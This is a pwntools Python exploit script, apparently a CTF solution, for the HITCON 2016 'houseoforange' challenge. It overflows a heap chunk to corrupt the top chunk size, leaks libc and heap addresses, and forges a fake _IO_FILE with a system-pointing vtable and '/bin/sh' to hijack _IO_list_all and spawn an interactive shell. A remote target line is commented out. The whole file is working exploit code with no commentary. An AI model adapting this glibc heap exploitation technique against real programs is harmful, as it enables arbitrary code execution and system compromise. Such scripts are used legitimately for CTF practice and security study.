from pwn import *

io = process("./houseoforange_hitcon_2016")
#io = remote('node4.buuoj.cn', 25021)
elf = ELF("./houseoforange_hitcon_2016")
libc = elf.libc 
#libc = ELF("../../buuctf/libc/u16-x64.so")

def debug():
	gdb.attach(io)
	pause()

def add(size, name, price = 123, color = 1):
	io.sendlineafter(b'choice : ', b'1')
	io.sendlineafter(b'name :', str(size).encode())
	io.sendafter(b'Name :', name)
	io.sendlineafter(b'Price of Orange:', str(price).encode())
	io.sendlineafter(b'Color of Orange:', str(color).encode())

def see():
	io.sendlineafter(b'choice : ', b'2')
	io.recvuntil(b'Name of house : ')
	name = io.recvuntil(b'\n')
	io.recvuntil(b'Price of orange : ')
	price = io.recvuntil(b'\n')
	return name, price


def upgrade(size, name, price = 123, color = 1):
	io.sendlineafter(b'choice : ', b'3')
	io.sendlineafter(b'name :', str(size).encode())
	io.sendafter(b'Name:', name)
	io.sendlineafter(b'Price of Orange: ', str(price).encode())
	io.sendlineafter(b'Color of Orange: ', str(color).encode())

add(0x10, b'A')
#debug()

payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0xfa1)
upgrade(len(payload), payload)
#debug()
add(0x1000, b'A')
#debug()
add(0x400, b'A'*0x8)
#debug()

name, _ = see()
#print(name)
main_arena = u64(name[8:8+6].ljust(8, b'\x00')) - 1640
libc_base = main_arena - 0x10 - libc.symbols['__malloc_hook']
print("main_arena:", hex(main_arena))
print("libc_base:", hex(libc_base))

payload = b'A'*0x10
upgrade(len(payload), payload)
name, _ = see()
heap_base = u64(name[16:16+6].ljust(8, b'\x00'))
print("heap_base:", hex(heap_base))
#debug()

system = libc_base + libc.symbols['system']
io_list_all = libc_base + libc.symbols['_IO_list_all']
payload  = p64(system)*4 + b'\x00'*0x400
fake_io_file  = b'/bin/sh\x00'
fake_io_file += p64(0x61)
fake_io_file += p64(0) # fd
fake_io_file += p64(io_list_all - 0x10) # bk
fake_io_file += p64(0) # _IO_write_base 
fake_io_file += p64(1) # _IO_write_ptr
fake_io_file += b'\x00'*0xa8
fake_io_file += p64(heap_base) # vtable
payload += fake_io_file
print(hex(len(payload)))
upgrade(len(payload), payload)
#debug()

io.sendlineafter(b'choice : ', b'1')
io.interactive()
